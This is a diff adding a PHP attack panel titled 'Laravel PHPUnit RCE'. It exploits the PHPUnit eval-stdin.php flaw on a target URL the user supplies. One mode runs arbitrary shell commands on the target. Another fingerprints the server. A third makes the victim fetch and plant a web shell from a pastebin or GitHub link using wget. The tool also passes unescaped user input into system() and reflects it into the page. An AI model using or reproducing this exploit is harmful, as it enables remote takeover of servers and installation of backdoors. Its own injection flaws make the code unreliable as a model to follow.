@@ -1,0 +1,171 @@
+<?php
+error_reporting(1);
+$c = "\x43\x72\x65"."\x61\x74e\x64\x20\x42"."\x79\x20\x44\x37"."\x6e\x65\x74";
+echo '
+<!DOCTYPE html>
+<html>
+<head>
+	<title>	PHPUNIT RCE </title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
+
+</head>
+<style>
+body {
+        text-shadow:0px 0px 1px #757575;
+        background-color: darkslateblue;
+        background-size: cover;
+        background-attachment: fixed;
+        background-repeat: no-repeat;
+    }
+    .directory-listing-table {
+      margin: auto;
+      background-color: rgb(0 0 0 / 57%);
+      padding: .6rem 1rem;
+      max-width: 1100px;
+      width: 65%;
+      border-radius: .75rem;
+      border: 2px solid darkslateblue;
+      box-shadow: 0 0 20px black;
+    }
+    thead, tr, td {
+        border-collapse:collapse;
+        background: transparent;
+        font-size: 13px;
+        color: #fff;
+    }
+h1 {
+	font-family: Orbitron;
+	color: #fff;
+}
+.pencet {
+    background-color: rgb(0 0 0 / 57%);
+    color: #fff;
+    border-color: blanchedalmond;
+}
+    input[type=text] {
+        width: 50%;  
+        background: rgba(0,0,0,0.3);
+        border: none;
+        outline: none;
+        padding: 5px;
+        font-size: 12px;
+        color: #fff;
+        text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
+        border: 1px solid rgba(0,0,0,0.3);
+        border-radius: 4px;
+        box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
+        -webkit-transition: box-shadow .5s ease;
+        -moz-transition: box-shadow .5s ease;
+        -o-transition: box-shadow .5s ease;
+        -ms-transition: box-shadow .5s ease;
+        transition: box-shadow .5s ease;
+    }
+    textarea {
+    border: 1px solid #ffffff;
+    width: 100%;
+    height: 340px;
+    padding-left: 2px;
+    resize: none;
+    overflow: auto;
+    color: #fff;
+    text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
+    border: 1px solid rgba(0,0,0,0.3);
+    border-radius: 4px;
+    box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
+    -webkit-transition: box-shadow .5s ease;
+    -moz-transition: box-shadow .5s ease;
+    -o-transition: box-shadow .5s ease;
+    -ms-transition: box-shadow .5s ease;
+    transition: box-shadow .5s ease;
+    background: rgba(0,0,0,0.3);
+}
+textarea::-webkit-scrollbar {
+  width: 12px;
+}
+
+textarea::-webkit-scrollbar-track {
+  background: #000000;
+}
+
+textarea::-webkit-scrollbar-thumb {
+  background-color: darkslateblue;
+  border: 3px solid black;
+}
+</style>
+<table class="directory-listing-table"><thead><td>
+<center>	
+<h1>Laravel PHPUnit RCE</h1>
+<button onclick=location.href="'.$_SERVER['SCRIPT_NAME'].'" class="pencet">Home</button>
+<button onclick=location.href="?rce" class="pencet">Command</button>
+<button onclick=location.href="?info" class="pencet">Information</button>
+<button onclick=location.href="?tanem" class="pencet">Tanem Shell</button><br>
+<br>'.$c.'<br>
+</table></thead></td><br>';
+if (isset($_GET['rce'])) {
+echo '<table class="directory-listing-table"><thead><td>
+<form method="POST">
+<input type="text" name="url" placeholder="http://www.target.com/[path]/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" value="'.$_POST['url'].'" style="width:600px;"><br><br>
+<input type="text" name="komen" placeholder="uname -a" value="'.$_POST['komen'].'" style="width:450px;" required><br><br>
+<input type="submit" class="pencet" value="execute" name="exec" id="exec" style="width:150px;"/></center><pre></form><textarea style="color: lime;">';
+	if(isset($_POST['exec'])) {		
+$web = $_POST['url'];
+$command = $_POST['komen'];
+$data = "<?php echo shell_exec('$command');?>";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL,$web);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+$result = curl_exec($ch);
+curl_close ($ch);
+print_r($result);
+echo '</textarea></pre></table></thead></td>';
+	} 
+}
+elseif(isset($_GET['info'])){
+	echo '<table class="directory-listing-table"><thead><td>
+	<form method="POST">
+	<input type="text" name="url" placeholder="http://www.target.com/[path]/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" value="'.$_POST['url'].'" style="width:600px;"><br><br>
+	<button type="submit" class="pencet" name="cek">Check now!</button><br><br>';
+	if(isset($_POST['cek'])) {
+$web = $_POST['url'];
+$data = "System : <?php echo php_uname();?><br>Software : <font color='orange'><?php echo php_sapi_name();?></font><br>Path : <font color='orange'><?php system('pwd');?></font><br> CurL : <?php if(function_exists('curl_init')){echo'<font color=lime>ON</font>';}else{
+    echo '<font color=red>OFF</font>';}?> ";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL,$web);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+$result = curl_exec($ch);
+curl_close ($ch);
+print_r($result);
+
+ }
+ echo '</table></thead></td>';
+}
+elseif(isset($_GET['tanem'])) {
+$shellname = $_POST['shellname'];
+$path = $_POST['dire'];
+$url = $_POST['url'];
+	echo '<table class="directory-listing-table"><thead><td>
+	<form method="POST">
+	<input type="text" name="dire" placeholder="[path]/vendor/phpunit/phpunit/src/Util/PHP/" style="width:600px;"><br><br>
+	<input type="text" name="url" placeholder="http://www.target.com/" style="width:600px;"><br><br>
+	<input type="text" name="raw" class="pencet" placeholder="https://pastebin.com/raw/asEAsc" style="width:400px;">[PAKAI GITHUB BISA BRO!]<br><br>
+	<input type="text" name="shellname" class="pencet" style="width:150px;" placeholder="shell.php"><br><br>
+	<button type="submit" class="pencet" name="tanem1">Submit</button><br><br></table></thead></td>';
+if(isset($_POST['tanem1'])) {
+system("curl --data \"<?system('wget ".$_POST['raw']." -O ".$shellname."');?>\" -X GET ".$url."".$path."/eval-stdin.php");
+echo '<br><table class="directory-listing-table"><thead><td>
+<font color="#fff">Done =></font> <font color="lime">'.$url.''.$path.''.$shellname.'</font>
+<br><br> 
+<font color="#fff">Link :</font> <a href="'.$url.''.$path.''.$shellname.'" class="pencet" target="_blank">Click Here!</a></table></thead></td>'; 
+    }
+}
+?>
